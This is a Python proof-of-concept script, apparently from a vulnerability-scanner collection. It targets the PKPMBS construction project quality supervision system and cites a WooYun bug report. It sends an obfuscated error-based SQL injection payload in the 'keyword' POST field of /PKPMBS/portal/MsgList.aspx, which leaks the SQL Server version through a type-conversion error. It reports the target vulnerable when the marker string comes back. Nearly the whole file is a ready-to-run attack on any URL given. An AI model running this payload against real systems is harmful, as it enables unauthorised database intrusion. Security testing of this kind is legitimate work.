#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: pkpmbs建设工程质量监督系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0120366
author: Lucifer
description: 文件/PKPMBS/portal/MsgList.aspx postSQL注入。
'''
import sys
import json
import requests
import warnings
sys.path.append('../../')
from color import *

class pkpmbs_MsgList_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/PKPMBS/portal/MsgList.aspx"
        post_data = {
            "keyword":"1' AnD 1=CoNvErT(InT,(ChAr(71)+ChAr(65)+ChAr(79)+ChAr(74)+ChAr(73)+@@VeRsIoN)) AnD '%'='",
            "Submit3":"搜　索"
        }
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"GAOJIMicrosoft" in req.text:
                printGreen("[+]Success:存在pkpmbs建设工程质量监督系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
            else:
                printBlue("[-]Info:不存在pkpmbs_MsgList_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = pkpmbs_MsgList_sqli(sys.argv[1])
    testVuln.run()